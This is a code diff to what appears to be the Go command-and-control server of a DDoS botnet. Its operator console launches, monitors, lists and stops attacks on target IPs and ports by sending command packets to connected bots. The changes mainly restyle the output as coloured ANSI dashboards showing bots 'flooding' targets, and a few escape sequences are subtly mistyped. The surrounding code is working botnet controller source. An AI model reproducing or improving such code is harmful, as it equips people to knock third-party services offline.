@@ -661,12 +661,24 @@ func handleRequest(conn *tls.Conn) {
 						continue
 					}
 					AttackAnimation.Play(conn, 2*time.Second, "Launching Attack...")
+
+					// Attack Launch Success Display
 					conn.Write([]byte("\r\n"))
-					conn.Write([]byte(fmt.Sprintf("host: %s\r\n", ip)))
-					conn.Write([]byte(fmt.Sprintf("port: %s\r\n", port)))
-					conn.Write([]byte(fmt.Sprintf("length: %s\r\n", duration)))
-					conn.Write([]byte(fmt.Sprintf("method: %s\r\n", method)))
-					conn.Write([]byte("\r\n"))
+					conn.Write([]byte("\x1b[38;5;231m╭═══════════════════════════════════════════════╦══════════════════════════════╮\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║             § \x1b[38;5;51mAttack Launched Successfully!\x1b[38;5;231m §           ║   ┌────────────────────┐   ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣   │    ATTACK DEPLOYED   │   ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║ \x1b[38;5;45m● Attack Parameters Confirmed\x1b[38;5;231m                 ║   │      ACTIVE        │   ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣   └────────────────────┘   ║\n\r"))
+					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Method:    \x1b[38;5;82m%-30s\x1b[38;5;231m   ║   ░░░░░░░░░░░░░░░░░░░░░░   ║\r\n", method)))
+					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Target:    \x1b[38;5;82m%-15s:%-5s\x1b[38;5;231m         ║   ────────────────────   ║\r\n", ip, port)))
+					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Duration:  \x1b[38;5;82m%-30s\x1b[38;5;231m   ║   ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒   ║\r\n", duration+" seconds")))
+					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╬══════════════════════════════╣\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║ \x1b[38;5;45m● Network Status\x1b[38;5;231m                               ║   ┌────────────────────┐   ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣   │   BOTS ENGAGED     │   ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Status:    \x1b[38;5;82mATTACK INITIATED\x1b[38;5;231m                   ║   │    FLOODING...    │   ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Bots:      \x1b[38;5;82mSENDING PACKETS\x1b[38;5;231m                   ║   └────────────────────┘   ║\n\r"))
+					conn.Write([]byte("\x11b[38;5;231m╰═══════════════════════════════════════════════╩══════════════════════════════╯\r\n"))
+
 					attackLock.Lock()
 					ongoingAttacks[conn] = Attack{
 						method:   method,
@@ -681,7 +693,8 @@ func handleRequest(conn *tls.Conn) {
 					attackHistory = append(attackHistory, ongoingAttacks[conn])
 					historyLock.Unlock()
 					go func(conn net.Conn, attack Attack) {
-						ShowProgressBar(conn, attack.duration, "Attack Progress")
+						// Remove progress bar, just wait for duration
+						time.Sleep(attack.duration)
 						attackLock.Lock()
 						delete(ongoingAttacks, conn)
 						attackLock.Unlock()
@@ -698,53 +711,92 @@ func handleRequest(conn *tls.Conn) {
 					durInt, _ := strconv.Atoi(duration)
 					cmdPacket.Duration = uint32(durInt)
 					sendToBots(cmdPacket)
+
 				case "ongoing":
 					conn.Write([]byte("\033[2J\033[H"))
 					conn.Write([]byte("\033[3J\033[H\033[2J"))
 					conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
+					conn.Write([]byte("\r\n"))
+					conn.Write([]byte("\x1b[38;5;231m╭═══════════════════════════════════════════════╦══════════════════════════════╮\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║               § \x1b[38;5;51mCurrent Attack Status\x1b[38;5;231m §            ║ ╔══════════════════════════╗ ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣ ║      LIVE SESSION      ║ ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║ \x11b[38;5;45m● Active Attack Monitor\x1b[38;5;231m                      ║ ║   ┌─┐ ┌─┐ ┌─┐ ┌─┐ ┌─┐   ║ ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╬ ║   │ │ │ │ │ │ │ │ │   ║ ║\n\r"))
+
 					attackLock.Lock()
 					if attack, exists := ongoingAttacks[conn]; exists {
 						remaining := time.Until(attack.start.Add(attack.duration))
 						if remaining > 0 {
-							content := []string{
-								fmt.Sprintf("Method   : %-10s", attack.method),
-								fmt.Sprintf("IP       : %-15s", attack.ip),
-								fmt.Sprintf("Port     : %-5s", attack.port),
-								fmt.Sprintf("Duration : %d seconds remaining", int(remaining.Seconds())),
-							}
-							conn.Write([]byte("=== Ongoing Attack ===\r\n"))
-							for _, line := range content {
-								conn.Write([]byte(line + "\r\n"))
-							}
+							conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Status:    \x1b[38;5;82mATTACK IN PROGRESS\x1b[38;5;231m              ║ ║   └─┘ └─┘ └─┘ └─┘ └─┘   ║ ║\n\r"))
+							conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╬ ╚══════════════════════════╝ ║\n\r"))
+							conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Method:    \x1b[38;5;82m%-30s\x1b[38;5;231m   ║                            ║\r\n", attack.method)))
+							conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Target:    \x1b[38;5;82m%-15s:%-5s\x1b[38;5;231m         ║                            ║\r\n", attack.ip, attack.port)))
+							conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Remaining: \x1b[38;5;82m%-26d\x1b[38;5;231m   ║                            ║\r\n", int(remaining.Seconds()))))
+							conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Elapsed:   \x1b[38;5;82m%-26d\x1b[38;5;231m   ║                            ║\r\n", int(time.Since(attack.start).Seconds()))))
+							conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╩══════════════════════════════╣\n\r"))
+							conn.Write([]byte("\x1b[38;5;231m║              \x1b[38;5;51mAttack is actively running...\x1b[38;5;231m              ║\n\r"))
 						} else {
 							delete(ongoingAttacks, conn)
-							writeError(conn, "Attack has finished.")
+							conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Status:    \x1b[38;5;196mATTACK COMPLETED\x1b[38;5;231m                 ║ ╔══════════════════════════╗ ║\n\r"))
+							conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Message:   \x1b[38;5;196mSession cleaned up\x1b[38;5;231m                 ║ ║     FINISHED        ║ ║\n\r"))
+							conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╬ ╚══════════════════════════╝ ║\n\r"))
 						}
 					} else {
-						writeError(conn, "No ongoing attack found.")
+						conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Status:    \x1b[38;5;196mNO ACTIVE ATTACK\x1b[38;5;231m                  ║ ░░░░░░░░░░░░░░░░░░░░░░ ║\n\r"))
+						conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Message:   \x1b[38;5;196mNo ongoing attack found\x1b[38;5;231m             ║ ──────────────────── ║\n\r"))
+						conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╩══════════════════════════════╣\n\r"))
 					}
 					attackLock.Unlock()
+					conn.Write([]byte("\x1b[38;5;231m╰══════════════════════════════════════════════════════════════════════════════╯\n\r"))
 				case "allattacks":
 					conn.Write([]byte("\033[2J\033[H"))
 					conn.Write([]byte("\033[3J\033[H\033[2J"))
 					conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
+					conn.Write([]byte("\r\n"))
+					conn.Write([]byte("\x1b[38;5;231m╭═══════════════════════════════════════════════╦══════════════════════════════╮\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║              § \x1b[38;5;51mActive Attack Monitor\x1b[38;5;231m §        ║ ╔══════════════════════════╗ ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣ ║       LIVE ATTACKS       ║ ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║ \x1b[38;5;45m● Real-time Attack Dashboard\x1b[38;5;231m                  ║ ║    [►►►►►►►►►►►►►►►►►]   ║ ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣ ╚══════════════════════════╝ ║\n\r"))
+
 					combined := GetAllOngoingAttacks()
 					if len(combined) == 0 {
-						writeError(conn, "No active attacks.")
+						conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Status:    \x1b[38;5;196mNO ACTIVE ATTACKS\x1b[38;5;231m              ║    ░░░░░░░░░░░░░░░░░░░░░░░   ║\n\r"))
+						conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Message:   \x1b[38;5;196mAll systems idle\x1b[38;5;231m               ║     ────────────────────     ║\n\r"))
 					} else {
-						conn.Write([]byte("=== All Ongoing Attacks ===\r\n"))
-						for _, attack := range combined {
+						conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Active:    \x1b[38;5;82m%-26d\x1b[38;5;231m   ║ ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ ║\r\n", len(combined))))
+						conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Status:    \x1b[38;5;82mATTACKS IN PROGRESS\x1b[38;5;231m           ║ ●━━━━━━━━━━━━━━━━━━━━● ║\n\r"))
+						conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╬══════════════════════════════╣\n\r"))
+
+						for i, attack := range combined {
+							if i >= 5 { // Limit display to 5 attacks
+								conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   + %d more attacks running...\x1b[38;5;231m           ║                            ║\r\n", len(combined)-5)))
+								break
+							}
 							remaining := time.Until(attack.start.Add(attack.duration))
 							if remaining > 0 {
-								conn.Write([]byte(fmt.Sprintf("User: %-8s | Method: %-8s | IP: %-15s | Port: %-5s | %ds left\r\n",
-									attack.user, attack.method, attack.ip, attack.port, int(remaining.Seconds()))))
+								methodDisplay := attack.method
+								if len(methodDisplay) > 8 {
+									methodDisplay = methodDisplay[:8]
+								}
+								conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m%d\x1b[38;5;231m %-8s → %-15s:%-5s \x1b[38;5;196m%ds\x1b[38;5;231m ║                            ║\r\n",
+									i+1, methodDisplay, attack.ip, attack.port, int(remaining.Seconds()))))
 							}
 						}
 					}
+					conn.Write([]byte("\x1b[38;5;231m╰═══════════════════════════════════════════════╩══════════════════════════════╯\n\r"))
+
 				case "botstatus":
 					conn.Write([]byte("\033[2J\033[H"))
 					conn.Write([]byte("\033[3J\033[H\033[2J"))
 					conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
+					conn.Write([]byte("\r\n"))
+					conn.Write([]byte("\x1b[38;5;231m╭═══════════════════════════════════════════════╦══════════════════════════════╮\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║              § \x1b[38;5;51mBot Status Dashboard\x1b[38;5;231m §         ║    ┌─┐ ┌─┐ ┌─┐ ┌─┐ ┌─┐ ┌─┐   ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣    │ │ │ │ │ │ │ │ │ │ │ │   ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║ \x1b[38;5;45m● Detailed Bot Network Analysis\x1b[38;5;231m               ║    └─┘ └─┘ └─┘ └─┘ └─┘ └─┘   ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╬══════════════════════════════╣\n\r"))
+
 					botConnsLock.RLock()
 					totalBots := len(botConns)
 					botConnsLock.RUnlock()
@@ -765,14 +817,35 @@ func handleRequest(conn *tls.Conn) {
 						}
 					}
 
-					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231mTotal Bots: %d | Online: %d | Lagging: %d | Offline: %d\n\r",
-						totalBots, online, lagging, offline)))
+					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Total:     \x1b[38;5;82m%-26d\x1b[38;5;231m     ║ ╔══════════════════════════╗ ║\r\n", totalBots)))
+					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Online:    \x1b[38;5;82m%-26d\x1b[38;5;231m     ║ ║       BOT HEALTH         ║ ║\r\n", online)))
+					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Lagging:   \x1b[38;5;226m%-26d\x1b[38;5;231m     ║ ║     ●●●○○○●●●○○○●●●      ║ ║\r\n", lagging)))
+					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Offline:   \x1b[38;5;196m%-26d\x1b[38;5;231m     ║ ╚══════════════════════════╝ ║\r\n", offline)))
+					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╩══════════════════════════════╣\n\r"))
 
-					conn.Write([]byte("Detailed Status:\n\r"))
-					for botID, status := range statuses {
-						ping := heartbeatManager.GetBotPing(botID)
-						conn.Write([]byte(fmt.Sprintf("%s: %s (ping: %v)\n\r", botID, status, ping)))
+					if len(statuses) > 0 {
+						conn.Write([]byte("\x1b[38;5;231m║ \x1b[38;5;45m● Recent Bot Activity\x1b[38;5;231m                                 ║\n\r"))
+						conn.Write([]byte("\x1b[38;5;231m╠══════════════════════════════════════════════════════════════════════════╢\n\r"))
+						count := 0
+						for botID, status := range statuses {
+							if count >= 3 {
+								break
+							}
+							ping := heartbeatManager.GetBotPing(botID)
+							statusColor := "\x1b[38;5;82m"
+							if status == "LAGGING" {
+								statusColor = "\x1b[38;5;226m"
+							}
+							if status == "OFFLINE" {
+								statusColor = "\x1b[38;5;196m"
+							}
+							conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   %s%-8s: %-12s (ping: %-6v\x1b[38;5;231m                 ║\r\n",
+								statusColor, botID, status, ping)))
+							count++
+						}
 					}
+					conn.Write([]byte("\x1b[38;5;231m╰══════════════════════════════════════════════════════════════════════════════╯\n\r"))
+
 				case "stopattack":
 					attackLock.Lock()
 					if _, exists := ongoingAttacks[conn]; exists {
@@ -780,15 +853,36 @@ func handleRequest(conn *tls.Conn) {
 						var stopPacket CommandPacket
 						copy(stopPacket.Method[:], "STOP")
 						sendToBots(stopPacket)
-						writeSuccess(conn, "Attack stopped.")
+
+						conn.Write([]byte("\033[2J\033[H"))
+						conn.Write([]byte("\033[3J\033[H\033[2J"))
+						conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
+						conn.Write([]byte("\r\n"))
+						conn.Write([]byte("\x1b[38;5;231m╭═══════════════════════════════════════════════╦══════════════════════════════╮\n\r"))
+						conn.Write([]byte("\x1b[38;5;231m║              § \x1b[38;5;51mAttack Termination\x1b[38;5;231m §             ║   ┌────────────────────┐   ║\n\r"))
+						conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣   │    ATTACK STOPPED   │   ║\n\r"))
+						conn.Write([]byte("\x1b[38;5;231m║ \x1b[38;5;45m● Command Execution Result\x1b[38;5;231m                  ║   │     SUCCESSFUL     │   ║\n\r"))
+						conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣   └────────────────────┘   ║\n\r"))
+						conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Status:    \x1b[38;5;82mATTACK TERMINATED\x1b[38;5;231m               ║   ░░░░░░░░░░░░░░░░░░░░░░   ║\r\n"))
+						conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Action:    \x1b[38;5;82mBOTS NOTIFIED\x1b[38;5;231m                     ║   ────────────────────   ║\r\n"))
+						conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Time:      \x1b[38;5;82m%-26s\x1b[38;5;231m   ║   ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒   ║\r\n", time.Now().Format("15:04:05"))))
+						conn.Write([]byte("\x1b[38;5;231m╰═══════════════════════════════════════════════╩══════════════════════════════╯\n\r"))
 					} else {
 						writeError(conn, "No ongoing attack to stop.")
 					}
 					attackLock.Unlock()
+
 				case "attackhistory":
 					conn.Write([]byte("\033[2J\033[H"))
 					conn.Write([]byte("\033[3J\033[H\033[2J"))
 					conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
+					conn.Write([]byte("\r\n"))
+					conn.Write([]byte("\x1b[38;5;231m╭═══════════════════════════════════════════════╦══════════════════════════════╮\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║              § \x1b[38;5;51mAttack History Log\x1b[38;5;231m §           ║ ^ v ^ v ^ ^ v ^v v ^ v ^ v ^ ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣       HISTORICAL DATA        ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║ \x1b[38;5;45m● Past Attack Records\x1b[38;5;231m                         ║     ░░ ARCHIVED LOGS ░░      ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╬══════════════════════════════╣\n\r"))
+
 					historyLock.Lock()
 					var content []string
 					for i, attack := range attackHistory {
@@ -797,15 +891,28 @@ func handleRequest(conn *tls.Conn) {
 								i+1, attack.user, attack.method, attack.ip, attack.port, attack.duration),
 						)
 					}
+
 					if len(content) == 0 {
-						writeError(conn, "No past attacks recorded.")
+						conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Status:    \x1b[38;5;196mNO HISTORY RECORDS\x1b[38;5;231m             ║                              ║\n\r"))
+						conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Message:   \x1b[38;5;196mNo past attacks found\x1b[38;5;231m          ║ ║     EMPTY ARCHIVE        ║ ║\n\r"))
 					} else {
-						conn.Write([]byte("=== Attack History ===\r\n"))
-						for _, line := range content {
-							conn.Write([]byte(line + "\r\n"))
+						conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Records:   \x1b[38;5;82m%-26d\x1b[38;5;231m    ║ ║   ►►► HISTORY LOG ◄◄◄    ║ ║\r\n", len(content))))
+						conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Status:    \x1b[38;5;82mHISTORICAL DATA LOADED\x1b[38;5;231m      ║ ╚══════════════════════════╝ ║\n\r"))
+						conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╩══════════════════════════════╣\n\r"))
+
+						// Display first 3 history entries
+						for i := 0; i < 3 && i < len(content); i++ {
+							if len(content[i]) > 76 {
+								content[i] = content[i][:76]
+							}
+							conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║ %s\x1b[38;5;231m ║\r\n", content[i])))
+						}
+						if len(content) > 3 {
+							conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║ ... and %d more historical entries ...\x1b[38;5;231m                        ║\r\n", len(content)-3)))
 						}
 					}
 					historyLock.Unlock()
+					conn.Write([]byte("\x1b[38;5;231m╰═══════════════════════════════════════════════╩══════════════════════════════╯\n\r"))
 				case "bots", "bot":
 					count := getBotCount()
 					conn.Write([]byte("\033[2J\033[H"))
